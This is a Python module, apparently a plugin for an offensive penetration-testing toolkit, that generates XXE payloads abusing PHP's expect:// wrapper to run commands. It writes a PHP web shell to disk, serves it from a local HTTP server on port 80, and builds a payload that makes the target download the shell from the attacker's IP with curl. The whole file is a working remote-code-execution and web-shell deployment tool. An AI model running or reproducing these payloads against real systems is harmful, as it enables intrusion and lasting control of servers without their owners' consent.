import subprocess
from pathlib import Path

from core.attacker import get_ip


NAME = "xxe.rce"
DESCRIPTION = "Generate XXE RCE payloads and host a PHP web shell."


G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
M = "\033[95m"
W = "\033[0m"
BOLD = "\033[1m"


SHELL = """<?php system($_REQUEST["cmd"]);?>"""


def print_payload(title, payload):
    print(f"\n{G}[+] {title}{W}")
    print(payload)


def build_xml(entity):
    return f"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{entity}">
]>
<root>
    <name></name>
    <tel></tel>
    <email>&xxe;</email>
    <message></message>
</root>"""


def get_command():
    cmd = input(f"{Y}Command [id]>{W} ").strip()
    return cmd or "id"


def create_shell():
    shell = Path("shell.php")
    shell.write_text(SHELL)
    return shell


def start_http_server():

    try:
        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                "python3 -m http.server 80",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True

    except Exception:
        return False


def run(data, cred, args):

    ip = get_ip()
    command = get_command()

    shell = create_shell()
    server = start_http_server()

    #
    # Basic expect:// command execution
    #

    print_payload(
        "Expect Command Execution",
        build_xml(f"expect://{command}")
    )

    #
    # Download PHP web shell
    #

    print_payload(
        "Download PHP Web Shell",
        build_xml(
            f"expect://curl$IFS-O$IFS'{ip}/{shell.name}'"
        )
    )

    print(f"\n{G}[+] Web Shell{W}")
    print(shell.resolve())

    if server:
        print(f"\n{G}[+] HTTP Server Started{W}")
        print(f"http://{ip}/{shell.name}")
    else:
        print(f"\n{R}[-] Failed to start HTTP server.{W}")
        print("Run manually:")
        print("python3 -m http.server 80")

    print(f"\n{Y}[*]{W} The PHP expect extension is not enabled by default.")
    print(f"{Y}[*]{W} If expect:// is unavailable, use XXE for file disclosure or another attack path.")